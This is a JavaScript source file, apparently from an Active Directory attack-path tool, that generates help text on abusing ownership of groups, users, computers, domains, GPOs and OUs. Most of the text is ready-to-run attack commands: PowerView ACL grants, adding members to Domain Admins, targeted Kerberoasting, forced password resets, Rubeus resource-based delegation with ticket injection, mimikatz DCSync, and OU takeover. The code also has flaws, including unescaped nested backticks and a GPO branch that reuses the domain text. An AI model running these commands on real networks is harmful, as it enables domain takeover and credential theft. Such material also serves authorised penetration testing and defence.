const Abuse = (
    sourceName,
    sourceType,
    targetName,
    targetType,
    targetId,
    haslaps
) => {
    let text = ``;
    if (targetType === 'Group') {
        text = `To abuse ownership of a group object, you may grant yourself the AddMember privilege. This can be accomplished using the Add-DomainObjectAcl function in PowerView.
        
        You may need to authenticate to the Domain Controller as ${
            sourceType === 'User'
                ? `${sourceName} if you are not running a process as that user`
                : `a member of ${sourceName} if you are not running a process as a member`
        }. To do this in conjunction with Add-DomainObjectAcl, first create a PSCredential object (these examples comes from the PowerView help documentation):

        `$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
        $Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)`
        
        Then, use Add-DomainObjectAcl, optionally specifying $Cred if you are not already running a process as ${sourceName}:
        
        `Add-DomainObjectAcl -Credential $Cred -TargetIdentity "Domain Admins" -Rights WriteMembers`
        
        You can now add members to the group using the net binary or PowerView's Add-DomainGroupMember.

        There are at least two ways to execute this attack. The first and most obvious is by using the built-in net.exe binary in Windows (e.g.: net group "Domain Admins" harmj0y /add /domain). See the opsec considerations tab for why this may be a bad idea. The second, and highly recommended method, is by using the Add-DomainGroupMember function in PowerView. This function is superior to using the net.exe binary in several ways. For instance, you can supply alternate credentials, instead of needing to run a process as or logon as the user with the AddMember privilege. Additionally,  you have much safer execution options than you do with spawning net.exe (see the opsec tab).

        To abuse this privilege with PowerView's Add-DomainGroupMember, first import PowerView into your agent session or into a PowerShell instance at the console. You may need to authenticate to the Domain Controller as ${
            sourceType === 'User'
                ? `${sourceName} if you are not running a process as that user`
                : `a member of ${sourceName} if you are not running a process as a member`
        }. To do this in conjunction with Add-DomainGroupMember, first create a PSCredential object (these examples comes from the PowerView help documentation):

        `$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
        $Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)`

        Then, use Add-DomainGroupMember, optionally specifying $Cred if you are not already running a process as ${sourceName}:

        `Add-DomainGroupMember -Identity 'Domain Admins' -Members 'harmj0y' -Credential $Cred`

        Finally, verify that the user was successfully added to the group with PowerView's Get-DomainGroupMember:

        `Get-DomainGroupMember -Identity 'Domain Admins'`

        Cleanup for this can be done using Remove-DomainObjectAcl
        
        `Remove-DomainObjectAcl - Credential $cred -TargetIdentity "Domain Admins" -Rights WriteMembers``;
    } else if (targetType === 'User') {
        text = `To abuse ownership of a user object, you may grant yourself the GenericAll privilege. This can be accomplished using the Add-DomainObjectAcl function in PowerView.
        
        You may need to authenticate to the Domain Controller as ${
            sourceType === 'User'
                ? `${sourceName} if you are not running a process as that user`
                : `a member of ${sourceName} if you are not running a process as a member`
        }. To do this in conjunction with Add-DomainObjectAcl, first create a PSCredential object (these examples comes from the PowerView help documentation):

        `$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
        $Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)`
        
        Then, use Add-DomainObjectAcl, optionally specifying $Cred if you are not already running a process as ${sourceName}:
        
        `Add-DomainObjectAcl -Credential $Cred -TargetIdentity harmj0y -Rights All`
        
        <h4> Targeted Kerberoast </h4>
        A targeted kerberoast attack can be performed using PowerView’s Set-DomainObject along with Get-DomainSPNTicket.

        You may need to authenticate to the Domain Controller as ${
            sourceType === 'User'
                ? `${sourceName} if you are not running a process as that user`
                : `a member of ${sourceName} if you are not running a process as a member`
        }. To do this in conjunction with Set-DomainObject, first create a PSCredential object (these examples comes from the PowerView help documentation):

        `$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
        $Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)`

        Then, use Set-DomainObject, optionally specifying $Cred if you are not already running a process as ${sourceName}:

        `Set-DomainObject -Credential $Cred -Identity harmj0y -SET @{serviceprincipalname='nonexistent/BLAHBLAH'}`

        After running this, you can use Get-DomainSPNTicket as follows:
            
        `Get-DomainSPNTicket -Credential $Cred harmj0y | fl`

        The recovered hash can be cracked offline using the tool of your choice. Cleanup of the ServicePrincipalName can be done with the Set-DomainObject command:

        `Set-DomainObject -Credential $Cred -Identity harmj0y -Clear serviceprincipalname`

        <h4> Force Change Password </h4>
        There are at least two ways to execute this attack. The first and most obvious is by using the built-in net.exe binary in Windows (e.g.: net user dfm.a Password123! /domain). See the opsec considerations tab for why this may be a bad idea. The second, and highly recommended method, is by using the Set-DomainUserPassword function in PowerView. This function is superior to using the net.exe binary in several ways. For instance, you can supply alternate credentials, instead of needing to run a process as or logon as the user with the ForceChangePassword privilege. Additionally, you have much safer execution options than you do with spawning net.exe (see the opsec tab).

        To abuse this privilege with PowerView's Set-DomainUserPassword, first import PowerView into your agent session or into a PowerShell instance at the console. You may need to authenticate to the Domain Controller as ${
            sourceType === 'User'
                ? `${sourceName} if you are not running a process as that user`
                : `a member of ${sourceName} if you are not running a process as a member`
        }. To do this in conjunction with Set-DomainUserPassword, first create a PSCredential object (these examples comes from the PowerView help documentation):

        `$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
        $Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)`

        Then create a secure string object for the password you want to set on the target user:

        `$UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force`

        Finally, use Set-DomainUserPassword, optionally specifying $Cred if you are not already running a process as ${sourceName}:

        `Set-DomainUserPassword -Identity andy -AccountPassword $UserPassword -Credential $Cred`

        Now that you know the target user's plain text password, you can either start a new agent as that user, or use that user's credentials in conjunction with PowerView's ACL abuse functions, or perhaps even RDP to a system the target user has access to. For more ideas and information, see the references tab.
        
        Cleanup of the added ACL can be performed with Remove-DomainObjectAcl:
        
        `Remove-DomainObjectAcl -Credential $Cred -TargetIdentity harmj0y -Rights All``;
    } else if (targetType === 'Computer') {
        if (haslaps) {
            text = `To abuse ownership of a computer object, you may grant yourself the GenericAll privilege.
        
            You may need to authenticate to the Domain Controller as ${
                sourceType === 'User'
                    ? `${sourceName} if you are not running a process as that user`
                    : `a member of ${sourceName} if you are not running a process as a member`
            }. To do this in conjunction with Add-DomainObjectAcl, first create a PSCredential object (these examples comes from the PowerView help documentation):

            `$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
            $Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)`
            
            Then, use Add-DomainObjectAcl, optionally specifying $Cred if you are not already running a process as ${sourceName}:
            
            `Add-DomainObjectAcl -Credential $Cred -TargetIdentity windows1 -Rights All`
            
            Once you have granted yourself this privilege, you may read the ms-Ads-AdmPwd attribute on the computer object in LDAP which contains the local administrator password.
            
            Alternatively, you can execute a resource based constrained delegation attack.

            Abusing this primitive is currently only possible through the Rubeus project.
        
            First, if an attacker does not control an account with an SPN set, Kevin Robertson's Powermad project can be used to add a new attacker-controlled computer account:
            
            `New-MachineAccount -MachineAccount attackersystem -Password $(ConvertTo-SecureString 'Summer2018!' -AsPlainText -Force)`
            
            PowerView can be used to then retrieve the security identifier (SID) of the newly created computer account:
            
            `$ComputerSid = Get-DomainComputer attackersystem -Properties objectsid | Select -Expand objectsid`
            
            We now need to build a generic ACE with the attacker-added computer SID as the principal, and get the binary bytes for the new DACL/ACE:
            
            `$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
            $SDBytes = New-Object byte[] ($SD.BinaryLength)
            $SD.GetBinaryForm($SDBytes, 0)`
            
            Next, we need to set this newly created security descriptor in the msDS-AllowedToActOnBehalfOfOtherIdentity field of the comptuer account we're taking over, again using PowerView in this case:
            
            `Get-DomainComputer $TargetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}`
            
            We can then use Rubeus to hash the plaintext password into its RC4_HMAC form:
            
            `Rubeus.exe hash /password:Summer2018!`
            
            And finally we can use Rubeus' *s4u* module to get a service ticket for the service name (sname) we want to "pretend" to be "admin" for. This ticket is injected (thanks to /ptt), and in this case grants us access to the file system of the TARGETCOMPUTER:
            
            `Rubeus.exe s4u /user:attackersystem$ /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:admin /msdsspn:cifs/TARGETCOMPUTER.testlab.local /ptt`

            Cleanup can be done using the Remove-DomainObjectAcl function:

            `Remove-DomainObjectAcl -Credential $Cred -TargetIdentity windows1 -Rights All``;
        } else {
            text = `To abuse ownership of a computer object, you may grant yourself the GenericAll privilege.
        
            You may need to authenticate to the Domain Controller as ${
                sourceType === 'User'
                    ? `${sourceName} if you are not running a process as that user`
                    : `a member of ${sourceName} if you are not running a process as a member`
            }. To do this in conjunction with Add-DomainObjectAcl, first create a PSCredential object (these examples comes from the PowerView help documentation):

            `$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
            $Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)`
            
            Then, use Add-DomainObjectAcl, optionally specifying $Cred if you are not already running a process as ${sourceName}:
            
            `Add-DomainObjectAcl -Credential $Cred -TargetIdentity windows1 -Rights All`
            
            Once you have granted yourself this privilege, you can execute a resource based constrained delegation attack.

            Abusing this primitive is currently only possible through the Rubeus project.
        
            First, if an attacker does not control an account with an SPN set, Kevin Robertson's Powermad project can be used to add a new attacker-controlled computer account:
            
            `New-MachineAccount -MachineAccount attackersystem -Password $(ConvertTo-SecureString 'Summer2018!' -AsPlainText -Force)`
            
            PowerView can be used to then retrieve the security identifier (SID) of the newly created computer account:
            
            `$ComputerSid = Get-DomainComputer attackersystem -Properties objectsid | Select -Expand objectsid`
            
            We now need to build a generic ACE with the attacker-added computer SID as the principal, and get the binary bytes for the new DACL/ACE:
            
            `$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
            $SDBytes = New-Object byte[] ($SD.BinaryLength)
            $SD.GetBinaryForm($SDBytes, 0)`
            
            Next, we need to set this newly created security descriptor in the msDS-AllowedToActOnBehalfOfOtherIdentity field of the comptuer account we're taking over, again using PowerView in this case:
            
            `Get-DomainComputer $TargetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}`
            
            We can then use Rubeus to hash the plaintext password into its RC4_HMAC form:
            
            `Rubeus.exe hash /password:Summer2018!`
            
            And finally we can use Rubeus' *s4u* module to get a service ticket for the service name (sname) we want to "pretend" to be "admin" for. This ticket is injected (thanks to /ptt), and in this case grants us access to the file system of the TARGETCOMPUTER:
            
            `Rubeus.exe s4u /user:attackersystem$ /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:admin /msdsspn:cifs/TARGETCOMPUTER.testlab.local /ptt`

            Cleanup can be done using the Remove-DomainObjectAcl function:

            `Remove-DomainObjectAcl -Credential $Cred -TargetIdentity windows1 -Rights All``;
        }
    } else if (targetType === 'Domain') {
        text = `To abuse ownership of a domain object, you may grant yourself the DcSync privileges.
        
        You may need to authenticate to the Domain Controller as ${
            sourceType === 'User'
                ? `${sourceName} if you are not running a process as that user`
                : `a member of ${sourceName} if you are not running a process as a member`
        }. To do this in conjunction with Add-DomainObjectAcl, first create a PSCredential object (these examples comes from the PowerView help documentation):

        `$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
        $Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)`
        
        Then, use Add-DomainObjectAcl, optionally specifying $Cred if you are not already running a process as ${sourceName}:
        
        `Add-DomainObjectAcl -Credential $Cred -TargetIdentity testlab.local -Rights DCSync`
        
        Once you have granted yourself this privilege, you may use the mimikatz dcsync function to dcsync the password of arbitrary principals on the domain

        `lsadump::dcsync /domain:testlab.local /user:Administrator`
        
        Cleanup can be done using the Remove-DomainObjectAcl function:
        `Remove-DomainObjectAcl -Credential $Cred -TargetIdentity testlab.local -Rights DCSync``;
    } else if (targetType === 'GPO') {
        text = `To abuse ownership of a domain object, you may grant yourself the DcSync privileges.
        
        You may need to authenticate to the Domain Controller as ${
            sourceType === 'User'
                ? `${sourceName} if you are not running a process as that user`
                : `a member of ${sourceName} if you are not running a process as a member`
        }. To do this in conjunction with Add-DomainObjectAcl, first create a PSCredential object (these examples comes from the PowerView help documentation):

        `$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
        $Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)`
        
        Then, use Add-DomainObjectAcl, optionally specifying $Cred if you are not already running a process as ${sourceName}:
        
        `Add-DomainObjectAcl -Credential $Cred -TargetIdentity TestGPO -Rights All`
        
        With full control of a GPO, you may make modifications to that GPO which will then apply to the users and computers affected by the GPO. Select the target object you wish to push an evil policy down to, then use the gpedit GUI to modify the GPO, using an evil policy that allows item-level targeting, such as a new immediate scheduled task. Then wait at least 2 hours for the group policy client to pick up and execute the new evil policy. See the references tab for a more detailed write up on this abuse
        
        Cleanup can be done using the Remove-DomainObjectAcl function:
        `Remove-DomainObjectAcl -Credential $Cred -TargetIdentity TestGPO -Rights All``;
    } else if (targetType === 'OU') {
        text = `<h4>Control of the Organization Unit</h4>
        With ownership of the OU object, you may grant yourself the GenericAll privilege. This can be accomplished using the Add-DomainObjectAcl function in PowerView.
        
        You may need to authenticate to the Domain Controller as ${
            sourceType === 'User'
                ? `${sourceName} if you are not running a process as that user`
                : `a member of ${sourceName} if you are not running a process as a member`
        }. To do this in conjunction with Add-DomainObjectACL, first create a PSCredential object (these examples comes from the PowerView help documentation):
        
        `$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
        $Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)`

        Then use Add-DomainObjectAcl, optionally specifying $Cred if you are not already running a process as a member of (the group that holds this ACE):
        
        `Add-DomainObjectAcl -Credential $Cred -TargetIdentity ${targetId} -Rights All`
        
        With full control of the OU, you may now add a new ACE on the OU that will inherit down to the objects under that OU. Below are two options depending on how targeted you choose to be in this step:
        
        <h4>Generic Descendent Object Takeover</h4>
        The simplest and most straight forward way to abuse control of the OU is to apply a GenericAll ACE on the OU that will inherit down to all object types. Again, this can be done using PowerView. This time we will use the New-ADObjectAccessControlEntry, which gives us more control over the ACE we add to the OU.
        
        First, we need to reference the OU by its ObjectGUID, not its name. The ObjectGUID for the OU ${targetName} is: ${targetId}.
        
        Next, we will fetch the GUID for all objects. This should be '00000000-0000-0000-0000-000000000000':
        
        `$Guids = Get-DomainGUIDMap
        $AllObjectsPropertyGuid = $Guids.GetEnumerator() | ?{$_.value -eq 'All'} | select -ExpandProperty name`

        Then we will construct our ACE. This command will create an ACE granting the "JKHOLER" user full control of all descendant objects:
        
        `$ACE = New-ADObjectAccessControlEntry -Verbose -PrincipalIdentity 'JKOHLER' -Right GenericAll -AccessControlType Allow -InheritanceType All -InheritedObjectType $AllObjectsPropertyGuid`
        
        Finally, we will apply this ACE to our target OU:
        `$OU = Get-DomainOU -Raw (OU GUID)
        $DsEntry = $OU.GetDirectoryEntry()
        $dsEntry.PsBase.Options.SecurityMasks = 'Dacl'
        $dsEntry.PsBase.ObjectSecurity.AddAccessRule($ACE)
        $dsEntry.PsBase.CommitChanges()`
        
        Now, the "JKOHLER" user will have full control of all descendent objects of each type.
        
        <h4>Targeted Descendent Object Takeoever</h4>
        If you want to be more targeted with your approach, it is possible to specify precisely what right you want to apply to precisely which kinds of descendent objects. You could, for example, grant a user "ForceChangePassword" privilege against all user objects, or grant a security group the ability to read every GMSA password under a certain OU. Below is an example taken from PowerView's help text on how to grant the "ITADMIN" user the ability to read the LAPS password from all computer objects in the "Workstations" OU:
        
        `$Guids = Get-DomainGUIDMap
        $AdmPropertyGuid = $Guids.GetEnumerator() | ?{$_.value -eq 'ms-Mcs-AdmPwd'} | select -ExpandProperty name
        $CompPropertyGuid = $Guids.GetEnumerator() | ?{$_.value -eq 'Computer'} | select -ExpandProperty name
        $ACE = New-ADObjectAccessControlEntry -Verbose -PrincipalIdentity itadmin -Right ExtendedRight,ReadProperty -AccessControlType Allow -ObjectType $AdmPropertyGuid -InheritanceType All -InheritedObjectType $CompPropertyGuid
        $OU = Get-DomainOU -Raw Workstations
        $DsEntry = $OU.GetDirectoryEntry()
        $dsEntry.PsBase.Options.SecurityMasks = 'Dacl'
        $dsEntry.PsBase.ObjectSecurity.AddAccessRule($ACE)
        $dsEntry.PsBase.CommitChanges()`
        `;
    }
    return { __html: text };
};

export default Abuse;